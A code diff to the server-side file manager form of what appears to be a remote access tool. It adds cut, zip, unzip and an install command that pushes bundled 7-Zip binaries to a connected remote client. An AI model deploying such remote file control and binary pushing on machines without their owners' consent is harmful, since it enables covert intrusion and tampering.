@@ -103,7 +103,7 @@ namespace Server.Forms
                                     Text = "socketDownload:" + Client.ID,
                                     F = F,
                                     DirPath = FullPath
-                                    
+
                                 };
                                 SD.Show();
                             }
@@ -304,6 +304,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "copyFile";
                     msgpack.ForcePathObject("File").AsString = files.ToString();
+                    msgpack.ForcePathObject("IO").AsString = "copy";
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
@@ -369,10 +370,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Path").AsString = "USER";
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
-            catch
-            {
-
-            }
+            catch { }
         }
 
         private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -398,6 +396,78 @@ namespace Server.Forms
         private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
         {
             Client?.Disconnected();
+        }
+
+        private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    StringBuilder files = new StringBuilder();
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        files.Append(itm.ToolTipText + "-=>");
+                    }
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "copyFile";
+                    msgpack.ForcePathObject("File").AsString = files.ToString();
+                    msgpack.ForcePathObject("IO").AsString = "cut";
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                        msgpack.ForcePathObject("Command").AsString = "zip";
+                        msgpack.ForcePathObject("Path").AsString = itm.ToolTipText;
+                        msgpack.ForcePathObject("Zip").AsString = "true";
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                        msgpack.ForcePathObject("Command").AsString = "zip";
+                        msgpack.ForcePathObject("Path").AsString = itm.ToolTipText;
+                        msgpack.ForcePathObject("Zip").AsString = "false";
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+            msgpack.ForcePathObject("Command").AsString = "installZip";
+            msgpack.ForcePathObject("exe").SetAsBytes(Properties.Resources._7z);
+            msgpack.ForcePathObject("dll").SetAsBytes(Properties.Resources._7z1);
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
     }
 }
